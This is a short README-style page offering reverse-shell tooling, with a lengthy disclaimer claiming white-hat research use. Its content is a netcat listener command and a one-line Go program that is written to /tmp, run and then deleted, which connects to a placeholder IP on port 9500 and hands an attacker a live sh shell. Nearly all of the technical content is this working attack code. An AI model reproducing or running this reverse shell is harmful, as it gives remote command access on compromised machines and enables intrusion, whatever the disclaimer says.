# Reverse shells

### Introduction

- This is NOT an exploit! This requires prior privileged access on a server in order to work! I am a professional security researcher. These are white hat tools used for research purposes only. Use this responsibly. Never use this software illegally.

-   IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE 
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, 
    EXEMPLARY, OR CONSEQUENTIAL DAMAGES.    

    DO NOT ATTEMPT TO USE THE TOOLS TO VIOLATE THE LAW.
    THE AUTHOR IS NOT RESPONSIBLE FOR ANY ILLEGAL ACTION.
    MISUSE OF THE SOFTWARE, INFORMATION, OR SOURCE CODE
    MAY RESULT IN CRIMINAL CHARGES.
    
    Use at your own risk.

### Using netcat


```bash
nc -lvnp 9500
```

### Golang Reverse Shell running

```golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","00.00.00.00:9500");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/temp.go && go run /tmp/temp.go && rm /tmp/temp.go
```
